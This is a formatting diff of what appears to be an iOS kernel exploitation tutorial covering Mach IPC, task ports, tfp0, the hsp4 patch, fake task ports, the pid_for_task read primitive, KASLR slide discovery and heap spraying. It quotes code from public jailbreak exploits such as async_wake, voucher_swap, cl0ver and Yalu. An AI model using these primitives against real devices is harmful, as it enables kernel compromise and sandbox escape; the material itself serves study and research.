@@ -47,6 +47,7 @@ The iOS Kernelcache comprises of the core kernel and it's kernel extensions. The
 
 Since the last couple of years, Apple has been open sourcing the ARM specific code as well, that can be found under **ifdef CONFIG_EMBEDDED** statements. Apple however still decides to keep some implementations to itself.
 
+{% highlight c %}
     File: /bsd/conf/param.c
 
     27285:    83  struct	timezone tz = { 0, 0 };
@@ -60,6 +61,7 @@ Since the last couple of years, Apple has been open sourcing the ARM specific co
     27293:    98: #if CONFIG_EMBEDDED
     27294:    99  int hard_maxproc = NPROC;	/* hardcoded limit -- for embedded the number of processes is limited by the ASID space */
     27295:   100  #else
+{% endhighlight %}
 
 It is possible to identify some vulnerabilities in the kernel by just auditing the source code. Some vulnerabilities can, however, be identified only by compiling the kernel (e.g., voucher_swap) and looking under the BUILD directory, which provides access to MIG generated code. Vulnerabilities that are present in kernel extensions are usually identified by reverse engineering since the Kexts code is not usually open source. Some vulnerabilities might be relevant only on Mac OS while some will be relevant only for iOS.
 
@@ -137,6 +139,7 @@ One of the unique features of the XNU kernel is its extensive use of **Mach IPC*
 
 Let's have a look at the kernel to find the Mach IPC related code. Navigate to **xnu-4903.221.1/osfmk/mach/message.h**. As discussed before, messages can be simple or complex in nature. In the image below, you can see the structure of a simple mach message (**mach_msg_base_t**), which includes a header(**mach_msg_header_t**) and a body(**mach_msg_body_t**). However, for a simple message, the body is ignored by the kernel.
 
+{% highlight c %}
     File: ./osfmk/mach/message.h
     397: typedef struct
     398: {
@@ -164,6 +167,7 @@ Let's have a look at the kernel to find the Mach IPC related code. Navigate to *
     420:         mach_msg_header_t       header;
     421:         mach_msg_body_t         body;
     422: } mach_msg_base_t;
+{% endhighlight %}
 
 The mach message header structure has the following attributes.
 
@@ -176,6 +180,7 @@ The mach message header structure has the following attributes.
 
 Complex messages are specified with the complex bit set to 1 in the **msgh_bits** as defined in message.h
 
+{% highlight c %}
     File: ./BUILD/obj/EXPORT_HDRS/osfmk/mach/message.h
     132: #define MACH_MSGH_BITS_ZERO		0x00000000
     133: 
@@ -194,9 +199,10 @@ Complex messages are specified with the complex bit set to 1 in the **msgh_bits*
     146: 
     147: #define	MACH_MSGH_BITS_RAISEIMP		0x20000000U	/* importance raised due to msg */
     148: #define MACH_MSGH_BITS_DENAP		MACH_MSGH_BITS_RAISEIMP
-
+{% endhighlight %}
 It also contains certain descriptors in addition to the header, and the number of descriptors is specified in the body (**msgh_descriptor_count**).
 
+{% highlight c %}
     File: ./BUILD/obj/EXPORT_HDRS/osfmk/mach/message.h
     388: typedef union
     389: {
@@ -225,9 +231,10 @@ It also contains certain descriptors in addition to the header, and the number o
     412:   mach_msg_id_t		msgh_id;
     413: } mach_msg_header_t;
     414: 
-
+{% endhighlight %}
 The **mach_msg_type_descriptor_t** field specifies what type of descriptor it is, and the other fields contains the corresponding data. The following types of descriptors are present:
 
+{% highlight c %}
     /*
      * In a complex mach message, the mach_msg_header_t is followed by 
      * a descriptor count, then an array of that number of descriptors 
@@ -256,6 +263,7 @@ The **mach_msg_type_descriptor_t** field specifies what type of descriptor it is
       unsigned int			pad3 : 24;
       mach_msg_descriptor_type_t	type : 8;
     } mach_msg_type_descriptor_t;
+{% endhighlight %}
 
 *   **MACH_MSG_PORT_DESCRIPTOR**: Sending a port in a message
 *   **MACH_MSG_OOL_DESCRIPTOR**: Sending OOL data in a message
@@ -268,6 +276,7 @@ Ports are represented by **mach_port_t** or **mach_port_name_t** in userland, bu
 
 In order to send or receive a message, the **mach_msg** and **mach_msg_overwrite** APIs can be used as defined in **osfmk/mach/message.h**. Let's have a look at some code samples to get a better understanding. The following code snippet shows the creation of a mach port using the **mach_port_allocate** API and getting a receive right to that port.
 
+{% highlight c %}
     //Initialize a Port
     mach_port_t port = MACH_PORT_NULL;
     kern_return_t err;
@@ -277,9 +286,10 @@ In order to send or receive a message, the **mach_msg** and **mach_msg_overwrite
         printf("Failed to Allocate a port \n");
         return MACH_PORT_NULL;
     }
-
+{% endhighlight %}
 The message can then be sent using the **mach_msg** Mach trap.
 
+{% highlight c %}
     typedef struct
     {
     	mach_msg_header_t header;
@@ -299,9 +309,10 @@ The message can then be sent using the **mach_msg** Mach trap.
     		      port,				/* Receive port */
     		      MACH_MSG_TIMEOUT_NONE,		/* No timeout */
     		      MACH_PORT_NULL);			/* No notification */
-
+{% endhighlight %}
 And can be received with **mach_msg**
 
+{% highlight c %}
     mach_port_t receive;
 
     err = mach_port_allocate (mach_task_self (),
@@ -314,6 +325,9 @@ And can be received with **mach_msg**
           receive,	/* Receive port */
           MACH_MSG_TIMEOUT_NONE, /* No timeout */
           MACH_PORT_NULL);/* No notification */
+{% endhighlight %}
+
+{% highlight c %}
 
     File: ./BUILD/obj/EXPORT_HDRS/osfmk/mach/message.h
     0959: /*
@@ -364,9 +378,10 @@ And can be received with **mach_msg**
     1004: 					mach_msg_timeout_t timeout,
     1005: 					mach_port_name_t notify);
     1006: 
-
+{% endhighlight %}
 If you have a send right to a port, you can insert that send right into another task using **mach_port_insert_right** and then sending the message using **mach_msg**. As discussed before, **mach_port_name_t** is meanigless outside a task's namespace, this is why the task (ipc_space_t) needs to be specified along with the **mach_port_name_t** so that the kernel can put the specified name (mach_port_name_t) into that task's namespace.
 
+{% highlight c %}
     /*
      *	Inserts the specified rights into the target task,
      *	using the specified name.  If inserting send/receive
@@ -390,6 +405,8 @@ If you have a send right to a port, you can insert that send right into another 
 
     kr = mach_port_insert_right(receiver_task, 0x1234, port,
     MACH_MSG_TYPE_MOVE_SEND);
+{% endhighlight %}
+
 
 ## MIG - Mach Interface Generator
 
@@ -397,6 +414,7 @@ A lot of the code written using Mach APIs involves the same boilerplate code, do
 
 MIG's specification files have the extension **defs**, and when the kernel is compiled, these files get processed by mig and result in addition of extra files, which contains the autogenerated MIG wrappers. For e.g, let's have a look at the task.defs file in **osfmk/mach/task.defs**. As you can see, each defs file has a subsystem name followed by an arbitrary number, which is declared at the very beginning of the file. In this case, the subsystem name is task and is the number is 3400\. The stub function may also check the validity of the arguments that are passed to it.
 
+{% highlight c %}
     File:/COMPILE_KERNEL/xnu-4570.41.2/osfmk/mach/task.defs
     65: subsystem
     66: #if KERNEL_SERVER
@@ -421,6 +439,7 @@ MIG's specification files have the extension **defs**, and when the kernel is co
     85: 
     86: /*
     87:  *  Destroy the target task, causing all of its threads
+{% endhighlight %}
 
 If you want to generate the MIG wrappers, you can simple run mig on any def file from a clean directory.
 
@@ -434,6 +453,7 @@ During compilation, the **mig** tool creates three files based on the subsystem 
 
 There are many **routines** defined in the generated file and these are basically the functions. Let's look at one specific Mach API **routine task_set_exception_ports** and have a look at the auto-generated MIG code.
 
+{% highlight c %}
     File:/COMPILE_KERNEL/xnu-4903.221.2/BUILD/obj/RELEASE_X86_64/osfmk/RELEASE/mach/task_server.c
     1697: /* Routine task_set_exception_ports */
     1698: mig_internal novalue _Xtask_set_exception_ports
@@ -461,13 +481,14 @@ There are many **routines** defined in the generated file and these are basicall
     1720:   typedef __Request__task_set_exception_ports_t __Request;
     1721:   typedef __Reply__task_set_exception_ports_t Reply __attribute__((unused));
     1722: 
-
+{% endhighlight %}
 It's quite important to audit the code in these functions as well. In the next article, we will discuss a vulnerability identified in the autogenerated MIG code obtained after building the kernel.
 
 ## Task Ports
 
 One of the other useful features of Mach Ports is that they serve as an abstraction over Objects, and the abstraction is provided by Mach Messages which mostly translate over MIG. For example, the Host Mach ports provide many APIs to get information about the host. The **host_kernel_version()** function will print out the kernel version. This is the same API used by the **uname -r** command. Looking at the file **osfmk/mach/mach_host.defs** will show all the routines provided by the host port APIs.
 
+{% highlight c %}
     File: ./osfmk/mach/mach_host.defs
     087: /*
     088:  *	Return information about this host.
@@ -497,9 +518,10 @@ One of the other useful features of Mach Ports is that they serve as an abstract
     112: 		host		: host_t;
     113: 	out	out_page_size	: vm_size_t);
     114: 
-
+{% endhighlight %}
 Similarly, the task ports serve as an abstraction over the task. The APIs can be found under **osfmk/mach/task.defs** or **osfmk/mach/task.defs** in the **BUILD** folder in the kernel.
 
+{% highlight c %}
     File: ./osfmk/mach/task.defs
     409: /*
     410:  * Read the selected state which is to be installed on new 
@@ -534,13 +556,14 @@ Similarly, the task ports serve as an abstraction over the task. The APIs can be
     439: routine task_resume2(
     440: 		suspend_token : task_suspension_token_t);
     441: 
-
+{% endhighlight %}
 These APIs are quite powerful and allow full interaction with the target task. Having a send right to the task port of a process will give full control over that task, which includes reading, writing and allocating of memory in the target tasks memory region. Btw, we are mentioning Task (coming from Mach) ports of a process (coming from BSD), this might seem wierd and it is important to note that while these are 2 different flavours of Mach, they are internally linked. Every associated BSD process has a corresponding Mach task and vice versa. The task struct can be found under **osfmk/kern/task.h** , this has a **bsd_info** field which is a pointer to the **proc** structure in **bsd/sys/proc_internal.h**. Similarly, the task field in the proc structure is a pointer to the task structure of that process.
 
 ![21]({{site.baseurl}}/images/21.png)
 
 Using the Mach Trap **task_for_pid**, it is possible to get a send right to the task port corresponding to the target PID to the caller. As can be seen from the comments below in the implementation in the file **bsd/vm/vm_unix.c**, it is only permitted to privileged processes or processes with the same user ID. Apart from being privileged, calling this API also requires certain entitlements (**get-task-allow** and **task_for_pid-allow**).
 
+{% highlight c %}
     File: /bsd/vm/vm_unix.c
     749: /*
     750:  *	Routine:	task_for_pid
@@ -613,11 +636,12 @@ Using the Mach Trap **task_for_pid**, it is possible to get a send right to the 
     817: 			if (tfpport == IPC_PORT_DEAD) {
     818: 				error = KERN_PROTECTION_FAILURE;
     819: 				goto tfpout;
-
+{% endhighlight %}
 Another thing you will notice here is the check for **pid=0**. This is done to prevent user specified process from accessing the send right to the kernel task port (tfp0) by specifying the pid 0\. Previously, once kernel r/w was obtained, the jailbreaks used to kill this check and call **task_for_pid(0)**. However, with the advent of **KPP** and **AMCC/KTRR**, patching wasn't possible anymore, and hence other techniques were used but the name **tfp0** still stuck and is still used to signify read and write access to kernel memory.
 
 The other API very commonly used is the **pid_for_task()** Mach Trap, which is used to find the pid for the process corresponding to a given Mach Task. What it basically does is looks up the **task** struct, looks up the **bsd_info** field which points to the corresponding BSD **proc** struct in the kernel, and reads the **p_pid** value from the **proc** struct. This technique has been widely used to read arbitrary kernel memory four bytes at a time (since the **pid** field is 32 bits) by creating a fake task port, which is discussed later in this article.
 
+{% highlight c %}
     File: /bsd/vm/vm_unix.c
     612: kern_return_t
     613: pid_for_task(
@@ -658,7 +682,7 @@ The other API very commonly used is the **pid_for_task()** Mach Trap, which is u
     648: 	return(err);
     649: }
     650: 
-
+{% endhighlight %}
 ## Kernel Task Port
 
 The kernel is assigned the PID 0, and the corresponding process-less task is dubbed as the kernel task. Having a send right to the Kernel task gives you complete control of the kernel memory, it is possible to read and write into kernel memory and also inject arbitrary code by allocating memory. This is what exploits try to obtain.
@@ -667,6 +691,7 @@ As discussed before, one of the earlier ways to use **task_for_pid(0)** was by P
 
 Once the kernel task port is obtained, the following five MACH APIs are frequently used to interact with the memory. It is important to note that to execute this function successfully, the caller must have a send right to the task port of the target task. If you look at the function prototype, the first argument is the target task (**vm_map_t target_task**). You can pass the kernel task port (**mach_port_t tfp0**) as the first argument, and the API will gladly accept it.
 
+{% highlight c %}
     /*Allocate a region of virtual memory in the target task starting from user specified address*/
 
     kern_return_t 
@@ -717,11 +742,12 @@ Once the kernel task port is obtained, the following five MACH APIs are frequent
     	mach_vm_size_t size, 
     	boolean_t set_maximum,
     	svm_prot_t new_protection);
-
+{% endhighlight %}
 ## hsp4 Patch
 
 One of the other techniques Apple implemented for preventing jailbreakers from getting the kernel task was a pointer check for the **kernel_task**. In this case, while the handle to the kernel task was obtained, the Mach VM calls would not work. The check starts from the **ipc_kmsg_trace_send** function. This calls the function **convert_port_to_task_with_exec_token**(Line 356) in **osfmk/kern/ipc_kobject.c**.
 
+{% highlight c %}
     File: ./osfmk/kern/ipc_kobject.c
     343: 	/*
     344: 	 * Find the routine to call, and call it
@@ -762,9 +788,10 @@ One of the other techniques Apple implemented for preventing jailbreakers from g
     379: 		    ((mig_reply_error_t *) reply->ikm_header)->RetCode
     380: 			= MIG_BAD_ID;
     381: 		}
-
+{% endhighlight %}
 The function **convert_port_to_task_with_exec_token** then calls **task_conversion_eval**(Line 1543).
 
+{% highlight c %}
     File: ./osfmk/kern/ipc_tt.c
     1517: /*
     1518:  *	Routine:	convert_port_to_task_with_exec_token
@@ -809,9 +836,10 @@ The function **convert_port_to_task_with_exec_token** then calls **task_conversi
     1557: 	return (task);
     1558: }
     1559: 
-
+{% endhighlight %}
 This is where the check happens. The victim is the task on which operation is being performed and the caller is the one calling the function. The first check assumes if the caller is the kernel, and returns success if so. The second check is whether the caller is the same as the victim, which should be fine as a task should be able to perform operations on itself. The third check is where it makes a difference, if you make a change to the **kernel_task** and you are not **kernel_task** yourself, then the check will fail. However, this is just a pointer check with the **kernel_task**.
 
+{% highlight c %}
     File: ./osfmk/kern/ipc_tt.c
     1369: kern_return_t
     1370: task_conversion_eval(task_t caller, task_t victim)
@@ -857,11 +885,12 @@ This is where the check happens. The victim is the task on which operation is be
     1410: 	return KERN_SUCCESS;
     1411: }
     1412: 
-
+{% endhighlight %}
 So while the kernel task is still obtained, you won't be able to call the Mach APIs on it since it goes through the conversion APIs which will return **KERN_INVALID_SECURITY** and the previous function will return a **TASK_NULL**. There is another check by the way, which is that on embedded platforms, the code checks for the **TF_PLATFORM** flag in the code signature, which is nothing but the **platform-application** entitlement, which means that a caller without this entitlement cannot perform an operation on the victim that has this entitlement. We will discuss this in Part 3 of this series.
 
 Hence, one of the more recent techniques has been to use the **host_get_special_port()** function. To understand this, head over to the file **osfmk/mach/host_special_ports.h**.
 
+{% highlight c %}
     File: ./BUILD/obj/EXPORT_HDRS/osfmk/mach/host_special_ports.h
     067: /*
     068:  * Cannot be set or gotten from user space
@@ -912,11 +941,12 @@ Hence, one of the more recent techniques has been to use the **host_get_special_
     113: /* obsolete name */
     114: #define HOST_CHUD_PORT HOST_LAUNCHCTL_PORT
     115: 
-
+{% endhighlight %}
 This contains a bunch of special ports, which as you might have guessed already from the comments, are used for special purposes. From the comments, it is clear that the first seven ports are reserved for the kernel itself. However, only three of them are being used so far. The **HOST_PORT** provides an abstraction over the host and **HOST_PRIV** is used for privileged operations, while the **HOST_IO_MASTER_PORT** is used to interact with devices. Each Host special port is mentioned with a particular number, which is of quite a significance. We can note that **#4** is not being used anywhere.
 
 Another thing worth mentioning is that in order to get send right to a host special port, you need to call **host_get_special_port** with an **int node** parameter, which is the number allocated to that special port.
 
+{% highlight c %}
     File: ./osfmk/kern/host.c
     1193: /*
     1194:  *      User interface for setting a special port.
@@ -966,14 +996,14 @@ Another thing worth mentioning is that in order to get send right to a host spec
     1238: 	return (KERN_SUCCESS);
     1239: }
     1240: 
-
+{% endhighlight %}
 Looking at the function, we can see that it requires the **host_priv** port as a parameter, and hence executing this call requires root permissions, in addition to all the sandbox checks. The **host_get_special_port** function essentially gets the port value from **realhost.special[node]** and returns it back to the caller.
 
 Coming back to the pointer check, if we can do a remap on the kernel task, write it to the unused port space, which is **realhost.special[4]**, and then call **host_get_special_port(4)**, this should give us a remapped and working kernel task.
 
 The following code snippet from **cl0ver** written by [Siguza](https://twitter.com/Siguza) does exactly that
 
-.
+.{% highlight c %}
 
     bool patch_host_special_port_4(task_t kernel_task)
     {
@@ -1034,7 +1064,7 @@ The following code snippet from **cl0ver** written by [Siguza](https://twitter.c
         DEBUG("Successfully installed patch");
         return true;
     }
-
+{% endhighlight %}
 This technique is also known as the **hsp4** patch and widely used in some of the recent jailbreaks.
 
 ## Faking Task Ports
@@ -1043,6 +1073,7 @@ One of the most common techniques used in some of the recent jailbreaks is that 
 
 Let's have a look at the stripped port structure which can be found in **osfmk/ipc/ipc_port.h**.
 
+{% highlight c %}
     File: ./osfmk/ipc/ipc_port.h}
     112: 
     113: struct ipc_port {
@@ -1077,10 +1108,11 @@ Let's have a look at the stripped port structure which can be found in **osfmk/i
     142: 		struct turnstile *send_turnstile;
     143: 		SLIST_ENTRY(ipc_port) dealloc_elm;
     144: 	} kdata2;
-    {code}
-
+   
+{% endhighlight %}
 The first attribute is an **ipc_object** struct that can be found in **osfmk/ipc/ipc_object.h**.
 
+{% highlight c %}
     File: ./osfmk/ipc/ipc_object.h
     088: /*
     089:  * The ipc_object is used to both tag and reference count these two data
@@ -1098,9 +1130,10 @@ The first attribute is an **ipc_object** struct that can be found in **osfmk/ipc
     101: 	ipc_object_refs_t io_references;
     102: 	lck_spin_t	io_lock_data;
     103: };
-
+{% endhighlight %}
 The first field is **io_bits**, the details about these bits can be found under **osfmk/ipc/ipc_object.h**
 
+{% highlight c %}
     File: ./osfmk/ipc/ipc_object.h
     124: /*
     125:  *	IPC steals the high-order bits from the kotype to use
@@ -1131,9 +1164,10 @@ The first field is **io_bits**, the details about these bits can be found under 
     150: #define IOT_PORT_SET		1
     151: #define IOT_NUMBER		2		/* number of types used */
     152: 
-
+{% endhighlight %}
 The **IO_BITS_ACTIVE** needs to be set to make sure the object is alive. The **IO_BITS_OTYPE** specifies the object type. The **IO_BITS_KOTYPE** field that determines what kind of port it is, whether it is a task port, or a clock port etc. While creating a fake port, you need to specify these values in the **io_bits** field. A full list can be found under **osfmk/kern/ipc_kobject.h**
 
+{% highlight c %}
     File: ./BUILD/obj/EXPORT_HDRS/osfmk/kern/ipc_kobject.h
     091: 
     092: #define	IKOT_NONE				0
@@ -1188,20 +1222,22 @@ The **IO_BITS_ACTIVE** needs to be set to make sure the object is alive. The **I
     141: 
     142: #define is_ipc_kobject(ikot)	((ikot) != IKOT_NONE)
     143: 
-
+{% endhighlight %}
 Setting the **io_bits** field of the ports would look as simple as this.
 
+{% highlight c %}
     #define IO_BITS_ACTIVE 0x80000000
     #define	IKOT_TASK 2
     #define IKOT_CLOCK 25
 
     fakeport->io_bits = IO_BITS_ACTIVE | IKOT_CLOCK;
     secondfakeport->io_bits = IKOT_TASK|IO_BITS_ACTIVE;
-
+{% endhighlight %}
 The **io_references** field of the **ipc_object** would also need to be set to anything other than 0, just to make sure the object isn't deallocated.
 
 Coming back to the port structure, one of the other important fields is the **struct ipc_space *receiver** field which points to the **ipc_space** struct. The **ipc_space** structure for a task defines its IPC abilities. Each IPC capability is represented by an **ipc_entry** and put in a table, which is pointed to by the **is_table** field in the **ipc_space** struct. The port rights or capablities in the **is_table** are 16 bits and have a name which is actually an index onto the **is_table**. It is important to note that within the kernel, port rights (**mach_port_t**) are represented by passing a pointer to the appropriate port data structure (**ipc_port_t**).
 
+{% highlight c %}
     File: ./osfmk/ipc/ipc_space.h
     114: 
     115: struct ipc_space {
@@ -1219,13 +1255,14 @@ Coming back to the port structure, one of the other important fields is the **st
     127: 	int is_node_id;			/* HOST_LOCAL_NODE, or remote node if proxy space */
     128: };
     129: 
-
+{% endhighlight %}
 The IPC space is a very important struct, and hence most exploits look for the kernel **ipc_space** in order to get a proper (yet fake) kernel task port. The trick has been to copy the **ipc_space_kernel** to a new memory and make your fake port's **receiver** field point to it.
 
 The **kobject** field points to different data structures depending on the **kobject** type set in the **io_bits** field. Hence if you are faking a task port, you need to point the **kobject** field to a **struct task**, and in case of a clock, a **struct clock**.
 
 That's it, so you need to fake the port until you make it :). Here is an example of creating a fake port from the async_wake exploit.
 
+{% highlight c %}
     uint8_t* build_message_payload(uint64_t dangling_port_address, uint32_t message_body_size, uint32_t message_body_offset, uint64_t vm_map, uint64_t receiver, uint64_t** context_ptr) {
       uint8_t* body = malloc(message_body_size);
       memset(body, 0, message_body_size);
@@ -1273,7 +1310,7 @@ That's it, so you need to fake the port until you make it :). Here is an example
       *(uint8_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_LCK_MTX_TYPE)) = 0x22;
       return body;
     }
-
+{% endhighlight %}
 For more details, i highly recommend checking out the this talk from CanSecWest [here](https://www.slideshare.net/i0n1c/cansecwest-2017-portal-to-the-ios-core).
 
 ## pid_for_task() arbitrary read technique
@@ -1282,6 +1319,7 @@ As discussed earlier, the **pid_for_task** Mach Trap will give out the **PID** o
 
 The following code from the voucher_swap exploit tries to do just that.
 
+{% highlight c %}
     /*
      * stage1_read32
      *
@@ -1317,9 +1355,10 @@ The following code from the voucher_swap exploit tries to do just that.
     	}
     	return (uint32_t) pid;
     }
-
+{% endhighlight %}
 Just combine the method twice and you can now read 64 bits at a time.
 
+{% highlight c %}
     /*
      * stage1_read64
      *
@@ -1336,11 +1375,12 @@ Just combine the method twice and you can now read 64 bits at a time.
     	u.value32[1] = stage1_read32(address + 4);
     	return u.value64;
     }
-
+{% endhighlight %}
 It is important to note that the offsets keep changing with different versions of iOS and its even different for different devices. These offsets are found both by looking at the kernel source code and also by looking at the kernelcache file.
 
 This technique is very powerful and allows you to scour the kernel memory 4 bytes at a time. Another very important use case for is function is to find the kernel slide. All they have to do is to start reading the kernel memory backwards four bytes at a time until you get to the magic value **0xfeedfacf**. This address will denote the base address of the kernel, subtract it from the start address on the kernelcache when opened with IDA or Hopper and you will get the kernel slide. The following code from the Yalu jailbreak does just that.
 
+{% highlight c %}
      while (1) {
             int32_t leaked = 0;
             // The offset from the start of "struct task" to "task->bsd_info" seems to be fixed to 0x360, but this is prone to change anytime in the future as apple sees fit
@@ -1363,9 +1403,10 @@ This technique is very powerful and allows you to scour the kernel memory 4 byte
     // Calculating KASLR slide
     extern uint64_t slide;
     slide = kernel_base - 0xFFFFFFF007004000;
-
+{% endhighlight %}
 Once kernel base is obtained, you can find some important structures in the kernel memory, such as **extern struct proclist allproc;**, which can be found in the file **/bsd/sys/proc_internal.h**, since even though the kernel is slid because of **KASLR**, the structs are still at a fixed offset from the kernel base. As we can see from the kernel code, this struct contains a list of the prcesses. The symbol addresses can also be found using ****jtool2** --analyze** feature, which utilizes the unstripped kernelcache that Apple mistakenly pushed out as a facilitator.
 
+{% highlight c %}
     File: ./bsd/sys/proc_internal.h
     673: extern lck_attr_t * proc_lck_attr;
     674: 
@@ -1383,9 +1424,10 @@ Once kernel base is obtained, you can find some important structures in the kern
     686: extern void proc_list_unlock(void);
     687: extern void proc_klist_lock(void);
     688: extern void proc_klist_unlock(void);
-
+{% endhighlight %}
 One can then scour these structs using again the same function **pid_for_task()** to find the current proc struct by checking for **pid = getpid()** (so we can change the creds in the proc struct later to escape the sandbox), and kernproc by checking for pid = 0 (so we can get kern proc creds, find kernel task, ipc_space_kernel etc).
 
+{% highlight c %}
     // extern struct proclist allproc;
     // This global variable stores the start of the linked_list of all proc objects
     uint64_t allproc = allproc_offset + kernel_base;
@@ -1421,7 +1463,7 @@ One can then scour these structs using again the same function **pid_for_task()*
         }
         proc_ = proc;
     }
-
+{% endhighlight %}
 ## Heap Allocation Basics
 
 This is a very brief discussion about Heap Allocation in iOS. In iOS, the heap memory is divided into various zones. Allocations of same size will go into same zones, unless for certain objects which have their own special zones (ports, vouchers etc). These zones grow as more objects are allocated, with the new pages being fetched from the zone map. One can see the zones allocated with the **zprint** command on Mac OS. It is assumed that a lot of heap allocation techniques will still be the same in iOS. Another thing is to note that iOS has zone garbage collection as well.
@@ -1438,6 +1480,7 @@ The heap has been hardened significantly in the last few iOS versions. I highly 
 
 One of the common techniques used in recent exploits for heap spraying is to fill the memory with an array of Port pointers by sending a Mach message with the option **MACH_MSG_OOL_PORTS_DESCRIPTOR**. This calls the method **ipc_kmsg_copyin_ool_ports_descriptor** in **ipc/ipc_kmsg.c** which has a kalloc call (**kalloc(ports_length)**) that fills the heap with port pointers. The advantage of this is in the voucher_swap exploit was that while the allocation of Ports would have put them into their own **ipc.port** zones, in the case of port pointers this is not the case and hence reallocation on top of freed objects with port pointers is possible. Well, again this is not entirely true and reallocation with ports is possible as you can do enough spraying with Ports such that the kernel is force to do garbage collection and allocate fresh pages from the zone map which might include the freed objects. This is discussed in Part 2 of this series.
 
+{% highlight c %}
     mach_msg_descriptor_t *
     ipc_kmsg_copyin_ool_ports_descriptor(
     	mach_msg_ool_ports_descriptor_t *dsc,
@@ -1453,7 +1496,7 @@ One of the common techniques used in recent exploits for heap spraying is to fil
             *mr = MACH_SEND_NO_BUFFER;
             return NULL;
         }
-
+{% endhighlight %}
 ## Pointer Authentication Check and CoreTrust
 
 The ARM 8.3 instruction set added a new feature called Pointer Authentication Check (PAC). It's purpose is to check the integrity of the pointers. It works by attaching a cryptographic signature to pointer values in its unused bits, and then those signatures are verified before a pointer is used. Since the attacker doesn't have the keys to create the signatures for these pointers, he is not able to create valid pointers.
